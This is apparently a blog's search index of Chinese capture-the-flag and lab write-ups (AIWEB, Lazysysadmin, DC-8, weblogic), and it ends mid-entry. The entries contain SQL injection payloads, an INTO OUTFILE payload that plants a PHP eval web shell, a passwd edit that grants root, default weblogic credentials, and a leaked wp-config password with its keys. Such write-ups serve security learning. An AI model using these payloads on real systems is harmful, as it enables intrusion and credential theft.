<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AIWEB</title>
      <link href="/2020/04/01/AIWEB/"/>
      <url>/2020/04/01/AIWEB/</url>
      
        <content type="html"><![CDATA[<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><img src="/images/AIWEB/image-20200401171003477.png" alt="image-20200401171003477"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>发现只开放了80端口，有<code>robots.txt</code>,泄露目录</p><p><img src="/images/AIWEB/image-20200401171032473.png" alt="image-20200401171032473"></p><h2 id="访问-se3reTdir777路径，发现存在注入漏洞"><a href="#访问-se3reTdir777路径，发现存在注入漏洞" class="headerlink" title="访问 se3reTdir777路径，发现存在注入漏洞"></a>访问 se3reTdir777路径，发现存在注入漏洞</h2><p><img src="/images/AIWEB/image-20200401171223469.png" alt="image-20200401171223469"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemUser,user表</span></span><br><span class="line">uid=1' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23&amp;Operation=Submit</span><br><span class="line"><span class="meta">#</span><span class="bash">  id,userName,password</span></span><br><span class="line">uid=1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x73797374656d55736572%23&amp;Operation=Submit</span><br><span class="line"><span class="meta">#</span><span class="bash"> t00r,aiweb1pwn,u3er</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RmFrZVVzZXJQYXNzdzByZA==, FakeUserPassw0rd</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ==,MyEvilPass_f908sdaf9_sadfasf0sa</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> TjB0VGhpczBuZUFsczA=, N0tThis0neAls0</span></span><br><span class="line">uid=1' and 1=2 union select 1,group_concat(userName),group_concat(password) from systemUser%23&amp;Operation=Submit</span><br><span class="line"><span class="meta">#</span><span class="bash"> id,firstName,lastName</span></span><br><span class="line">uid=1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x75736572%23&amp;Operation=Submit</span><br></pre></td></tr></table></figure><h3 id="扫描路径"><a href="#扫描路径" class="headerlink" title="扫描路径"></a>扫描路径</h3><p><img src="/images/AIWEB/image-20200401173107920.png" alt="image-20200401173107920"></p><h4 id="访问-m3diNf0-info-php，找到webroot"><a href="#访问-m3diNf0-info-php，找到webroot" class="headerlink" title="访问/m3diNf0/info.php，找到webroot"></a>访问/m3diNf0/info.php，找到webroot</h4><p><code>/home/www/html/web1x443290o2sdf92213</code></p><h3 id="sql写webshell"><a href="#sql写webshell" class="headerlink" title="sql写webshell"></a>sql写webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=1&apos; and 1=2 union select 1,&quot;&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;&quot;,3 into outfile &apos;/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/3.php&apos;%23&amp;Operation=Submit</span><br></pre></td></tr></table></figure><p><img src="/images/AIWEB/image-20200401215721870.png" alt="image-20200401215721870"></p><p><img src="/images/AIWEB/image-20200401215734215.png" alt="image-20200401215734215"></p><h3 id="菜刀连接上传大马，冰蝎连接"><a href="#菜刀连接上传大马，冰蝎连接" class="headerlink" title="菜刀连接上传大马，冰蝎连接"></a>菜刀连接上传大马，冰蝎连接</h3><p><img src="/images/AIWEB/image-20200401220113740.png" alt="image-20200401220113740"></p><h3 id="python反弹shell得到标准终端"><a href="#python反弹shell得到标准终端" class="headerlink" title="python反弹shell得到标准终端"></a>python反弹shell得到标准终端</h3><p><img src="/images/AIWEB/image-20200401220842112.png" alt="image-20200401220842112"></p><h3 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h3><p>发现其中一个用户与之前的数据库爆出的用户名一致</p><p><img src="/images/AIWEB/image-20200401221106333.png" alt="image-20200401221106333"></p><h4 id="切换用户，没有发现"><a href="#切换用户，没有发现" class="headerlink" title="切换用户，没有发现"></a>切换用户，没有发现</h4><p><img src="/images/AIWEB/image-20200401223536061.png" alt="image-20200401223536061"></p><h4 id="发现www-data对passwd文件可读写"><a href="#发现www-data对passwd文件可读写" class="headerlink" title="发现www-data对passwd文件可读写"></a>发现www-data对passwd文件可读写</h4><p><img src="/images/AIWEB/image-20200401224040961.png" alt="image-20200401224040961"></p><h4 id="修改-aiweb1pwn用户组为"><a href="#修改-aiweb1pwn用户组为" class="headerlink" title="修改 aiweb1pwn用户组为"></a>修改 aiweb1pwn用户组为</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aiweb1pwn:x:0:0:/home/aiweb1pwn:/bin/bash</span><br></pre></td></tr></table></figure><h3 id="重新切换用户，获得root权限"><a href="#重新切换用户，获得root权限" class="headerlink" title="重新切换用户，获得root权限"></a>重新切换用户，获得root权限</h3><p><img src="/images/AIWEB/image-20200401224628398.png" alt="image-20200401224628398"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lazysysadmin</title>
      <link href="/2020/04/01/Lazysysadmin/"/>
      <url>/2020/04/01/Lazysysadmin/</url>
      
        <content type="html"><![CDATA[<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><img src="/images/Lazysysadmin/image-20200401113247768.png" alt="image-20200401113247768"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/Lazysysadmin/image-20200401113335339.png" alt="image-20200401113335339"></p><h2 id="发现开启SMB文件共享，以及web页面"><a href="#发现开启SMB文件共享，以及web页面" class="headerlink" title="发现开启SMB文件共享，以及web页面"></a>发现开启SMB文件共享，以及web页面</h2><p><img src="/images/Lazysysadmin/image-20200401113835072.png" alt="image-20200401113835072"></p><h4 id="探测共享目录"><a href="#探测共享目录" class="headerlink" title="探测共享目录"></a>探测共享目录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 192.168.245.138</span><br></pre></td></tr></table></figure><p><img src="/images/Lazysysadmin/image-20200401113514727.png" alt="image-20200401113514727"></p><h4 id="share-目录下发现东西"><a href="#share-目录下发现东西" class="headerlink" title="share 目录下发现东西"></a>share 目录下发现东西</h4><p><img src="/images/Lazysysadmin/image-20200401113629249.png" alt="image-20200401113629249"></p><h4 id="此时可选择将文件下载下来"><a href="#此时可选择将文件下载下来" class="headerlink" title="此时可选择将文件下载下来"></a>此时可选择将文件下载下来</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get filename</span><br></pre></td></tr></table></figure><h4 id="或"><a href="#或" class="headerlink" title="或"></a>或</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># mount -t cifs -o username=&apos;&apos;,password=&apos;&apos; //192.168.10.152/share$ /mnt</span><br><span class="line">mount -t cifs -o username=&apos;root&apos;,password=&apos;&apos; //192.168.245.138/share$ /mnt</span><br></pre></td></tr></table></figure><p><img src="/images/Lazysysadmin/image-20200401140920949.png" alt="image-20200401140920949"></p><h4 id="找到wordpress配置文件"><a href="#找到wordpress配置文件" class="headerlink" title="找到wordpress配置文件"></a>找到wordpress配置文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the</span></span><br><span class="line"><span class="comment"> * installation. You don't have to use the web site, you can</span></span><br><span class="line"><span class="comment"> * copy this file to "wp-config.php" and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'wordpress'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'Admin'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, <span class="string">'TogieMYSQL12345^^'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line">define(<span class="string">'DB_CHARSET'</span>, <span class="string">'utf8'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don't change this if in doubt. */</span></span><br><span class="line">define(<span class="string">'DB_COLLATE'</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="comment"> * You can generate these using the &#123;<span class="doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'AUTH_KEY'</span>,         <span class="string">'SAq-)W,-K9tFcW(=?ro4SJ5)R.mx%+@KL-I@PB&#123;&lt;-i&gt;g3n^1|E&lt;-uN|&#125;F;:PbMYJ'</span>);</span><br><span class="line">define(<span class="string">'SECURE_AUTH_KEY'</span>,  <span class="string">'u .o%Ld%m27waNqK+*`~&amp;j6~v!d7vI|OwA|hd8%r#ri_`WRIcCN-KiTSWmk)1;xG'</span>);</span><br><span class="line">define(<span class="string">'LOGGED_IN_KEY'</span>,    <span class="string">'iX^NN~N7R5Mdmeh:$iLY60r~K[)^f5vk`wGDO30r8Ns)gA17FRt2|$#S!Lq@-&lt;|`'</span>);</span><br><span class="line">define(<span class="string">'NONCE_KEY'</span>,        <span class="string">',_xAk=+)B7f_a|#J44&#125;qWca!=`s4&#123;C2.Xe&gt;sY%4Ybd5*3z9WRH-ysm=.|Gm^McvU'</span>);</span><br><span class="line">define(<span class="string">'AUTH_SALT'</span>,        <span class="string">'(:^&lt;BWwzWYx ,f^9anxD,+V+2-&amp;,VJ@@)U7CSzjv_MvD67&gt;?05ihCG]Q1K:_7Xsa'</span>);</span><br><span class="line">define(<span class="string">'SECURE_AUTH_SALT'</span>, <span class="string">'ud]&#125;&#125;0rWRMGZ+a`Hky G7|i|+c7YyH4=l#5&#123;/1R=|]PYrOmN&#123;&amp;0JuqkO=o5vyGg5'</span>);</span><br><span class="line">define(<span class="string">'LOGGED_IN_SALT'</span>,   <span class="string">'=M_DRp%vGmijIhl%K!(v&gt;:,*RR&lt;cl9ahav%&#123;q`&amp;I/0HD/$W/LK:mxR37PKh?Zzi8'</span>);</span><br><span class="line">define(<span class="string">'NONCE_SALT'</span>,       <span class="string">'ABOgE&gt;G:U;Q/hO^&gt;jBG5e96OL6+&#123;=mV,|2S~c,~dhVa!E/&amp;Q[Mc8#IgVTuXAI&#125;sY'</span>);</span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$table_prefix  = <span class="string">'wp_'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the Codex.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://codex.wordpress.org/Debugging_in_WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">define(<span class="string">'WP_DEBUG'</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* That's all, stop editing! Happy blogging. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( !defined(<span class="string">'ABSPATH'</span>) )</span><br><span class="line">        define(<span class="string">'ABSPATH'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dynamic site URL added by Togie */</span></span><br><span class="line">$currenthost = <span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>];</span><br><span class="line">$currentpath = preg_replace(<span class="string">'@/+$@'</span>,<span class="string">''</span>,dirname($_SERVER[<span class="string">'SCRIPT_NAME'</span>]));</span><br><span class="line">$currentpath = preg_replace(<span class="string">'/\/wp.+/'</span>,<span class="string">''</span>,$currentpath);</span><br><span class="line">define(<span class="string">'WP_HOME'</span>,$currenthost.$currentpath);</span><br><span class="line">define(<span class="string">'WP_SITEURL'</span>,$currenthost.$currentpath);</span><br><span class="line">define(<span class="string">'WP_CONTENT_URL'</span>, $currenthost.$currentpath.<span class="string">'/wp-content'</span>);</span><br><span class="line">define(<span class="string">'WP_PLUGIN_URL'</span>, $currenthost.$currentpath.<span class="string">'/wp-content/plugins'</span>);</span><br><span class="line">define(<span class="string">'DOMAIN_CURRENT_SITE'</span>, $currenthost.$currentpath );</span><br><span class="line">@define(<span class="string">'ADMIN_COOKIE_PATH'</span>, <span class="string">'./'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH . <span class="string">'wp-settings.php'</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-8</title>
      <link href="/2020/03/31/DC-8/"/>
      <url>/2020/03/31/DC-8/</url>
      
        <content type="html"><![CDATA[<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><img src="/images/DC-8/image-20200331155204947.png" alt="image-20200331155204947"></p><h2 id="扫描端口，发现80端口打开，打开web页面"><a href="#扫描端口，发现80端口打开，打开web页面" class="headerlink" title="扫描端口，发现80端口打开，打开web页面"></a>扫描端口，发现80端口打开，打开web页面</h2><p>发现是 <a href="https://www.drupal.org/" target="_blank" rel="noopener">Drupal</a> CMS</p><p><img src="/images/DC-8/image-20200331155327628.png" alt="image-20200331155327628"></p><h2 id="探测版本，用msf中的EXp尝试未果"><a href="#探测版本，用msf中的EXp尝试未果" class="headerlink" title="探测版本，用msf中的EXp尝试未果"></a>探测版本，用msf中的EXp尝试未果</h2><p><img src="/images/DC-8/image-20200331155421152.png" alt="image-20200331155421152"></p><h2 id="发现SQL注入漏洞，爆出用户名密码"><a href="#发现SQL注入漏洞，爆出用户名密码" class="headerlink" title="发现SQL注入漏洞，爆出用户名密码"></a>发现SQL注入漏洞，爆出用户名密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.245.137/?nid=1 and 1=2 union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273#</span><br></pre></td></tr></table></figure><p><img src="/images/DC-8/image-20200331155609221.png" alt="image-20200331155609221"></p><h2 id="访问robots-txt-查看后台路径"><a href="#访问robots-txt-查看后台路径" class="headerlink" title="访问robots.txt,查看后台路径"></a>访问robots.txt,查看后台路径</h2><p><img src="/images/DC-8/image-20200331161030976.png" alt="image-20200331161030976"></p><h4 id="修改concat-us返回页面代码"><a href="#修改concat-us返回页面代码" class="headerlink" title="修改concat us返回页面代码"></a>修改concat us返回页面代码</h4><p><img src="/images/DC-8/image-20200331162208236.png" alt="image-20200331162208236"></p><p><img src="/images/DC-8/image-20200331162216716.png" alt="image-20200331162216716"></p><h2 id="system函数未禁用，改为执行命令，反连shell"><a href="#system函数未禁用，改为执行命令，反连shell" class="headerlink" title="system函数未禁用，改为执行命令，反连shell"></a>system函数未禁用，改为执行命令，反连shell</h2><p><img src="/images/DC-8/image-20200331164145354.png" alt="image-20200331164145354"></p><p><img src="/images/DC-8/image-20200331164130920.png" alt="image-20200331164130920"></p><h2 id="查找可提权命令"><a href="#查找可提权命令" class="headerlink" title="查找可提权命令"></a>查找可提权命令</h2><p><img src="/images/DC-8/image-20200331164320238.png" alt="image-20200331164320238"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解析漏洞</title>
      <link href="/2020/03/27/nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/03/27/nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch基本操作与漏洞复现</title>
      <link href="/2020/03/27/ElasticSearch%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/03/27/ElasticSearch%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h3><p><a href="http://127.0.0.1:9200" target="_blank" rel="noopener">http://127.0.0.1:9200</a>             #获取elasticsearch的信息</p><p><a href="http://127.0.0.1:9200/_cat/health?v&amp;pretty" target="_blank" rel="noopener">http://127.0.0.1:9200/_cat/health?v&amp;pretty</a>   #获取elasticsearch的状态信息</p><p><a href="http://127.0.0.1:9200/_cat/nodes?v&amp;pretty" target="_blank" rel="noopener">http://127.0.0.1:9200/_cat/nodes?v&amp;pretty</a>   #获取elasticsearch的节点信息</p><p><a href="http://127.0.0.1:9200/_cat/indices?v&amp;pretty" target="_blank" rel="noopener">http://127.0.0.1:9200/_cat/indices?v&amp;pretty</a>  #获取elasticsearch的索引信息  </p><h3 id="基础操作：增删改查"><a href="#基础操作：增删改查" class="headerlink" title="基础操作：增删改查"></a>基础操作：增删改查</h3><p>查询语法：  <a href="https://www.jianshu.com/p/f751ce9cd41b" target="_blank" rel="noopener">https://www.jianshu.com/p/f751ce9cd41b</a></p><h4 id="elasticsearch增加文档"><a href="#elasticsearch增加文档" class="headerlink" title="elasticsearch增加文档"></a>elasticsearch增加文档</h4><h4 id="插入数据："><a href="#插入数据：" class="headerlink" title="插入数据："></a>插入数据：</h4><p>ip:port/索引/类型/指定文档id</p><p>body raw json   注意要用双引号，单引号会有问题</p><h4 id="查询数据："><a href="#查询数据：" class="headerlink" title="查询数据："></a>查询数据：</h4><p>student/good/_search?q=*  只显示默认的十条，否则需要分页</p><p>分页查询</p><p>student/good/_search?pretty=*</p><p>json:匹配所有</p><p>{</p><p>  “query”:{“match_all”:{}}</p><p>}</p><h3 id="python连接elasticsearch"><a href="#python连接elasticsearch" class="headerlink" title="python连接elasticsearch"></a>python连接elasticsearch</h3><p>（1）安装相应版本的elasticsearch7模块</p><p>  pip install elasticsearch7</p><p>（2）操作es</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> elasticsearch7 <span class="keyword">import</span> Elasticsearch</span><br><span class="line"></span><br><span class="line">es = Elasticsearch(hosts=<span class="string">"http://flag.re:9200/"</span>)</span><br><span class="line"></span><br><span class="line">print(es.info())</span><br><span class="line"></span><br><span class="line">result = es.search(index=<span class="string">'king7'</span>, doc_type=<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">print(result[<span class="string">'hits'</span>][<span class="string">'hits'</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ActiveMQ漏洞复现</title>
      <link href="/2020/03/27/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/03/27/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic漏洞复现</title>
      <link href="/2020/03/26/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/03/26/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建（使用vulhub）"><a href="#环境搭建（使用vulhub）" class="headerlink" title="环境搭建（使用vulhub）"></a>环境搭建（使用vulhub）</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 进到目录下执行</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="1、弱口令漏洞"><a href="#1、弱口令漏洞" class="headerlink" title="1、弱口令漏洞"></a>1、弱口令漏洞</h2><h3 id="尝试弱口令登录"><a href="#尝试弱口令登录" class="headerlink" title="尝试弱口令登录"></a>尝试弱口令登录</h3><p>默认用户名：weblogic</p><p>默认密码：Oracle@123</p><h3 id="进入控制台可部署上传webshell文件"><a href="#进入控制台可部署上传webshell文件" class="headerlink" title="进入控制台可部署上传webshell文件"></a>进入控制台可部署上传webshell文件</h3><p><img src="/images/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200326160447139.png" alt="image-20200326160447139"></p><p>部署完成后使用：压缩文件名/jsp文件名作为路径访问</p><p> <a href="http://192.168.245.128:7001/t0/jsp.jsp" target="_blank" rel="noopener">http://192.168.245.128:7001/t0/jsp.jsp</a> </p><h3 id="上传成功后可访问大马"><a href="#上传成功后可访问大马" class="headerlink" title="上传成功后可访问大马"></a>上传成功后可访问大马</h3><p><img src="/images/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200326160802381.png" alt="image-20200326160802381"></p><h3 id="进一步，破解账户密码"><a href="#进一步，破解账户密码" class="headerlink" title="进一步，破解账户密码"></a>进一步，破解账户密码</h3><p>可下载</p><p><code>/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat</code></p><p>在</p><p><code>/root/Oracle/Middleware/user_projects/domains/base_domain/config/config.xml</code></p><p>可找到加密后的用户名密码</p><p><img src="/images/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200326161706938.png" alt="image-20200326161706938"></p><p>利用下载下来的密钥文件和密文破解账号</p><p>可使用破解脚本或破解工具</p><p><img src="/images/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200326161859256.png" alt="image-20200326161859256"></p><h2 id="2、反序列化漏洞"><a href="#2、反序列化漏洞" class="headerlink" title="2、反序列化漏洞"></a>2、反序列化漏洞</h2><p>利用反序列化利用工具上传大马</p><p><img src="/images/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200326161948916.png" alt="image-20200326161948916"></p><p>上传webshell</p><p><img src="/images/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200326162023490.png" alt="image-20200326162023490"></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>1、jsp webshell</p><p> <a href="https://github.com/XHSecurity/JspSpy.jsp" target="_blank" rel="noopener">https://github.com/XHSecurity/JspSpy.jsp</a> </p><p>2、密码破解jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span 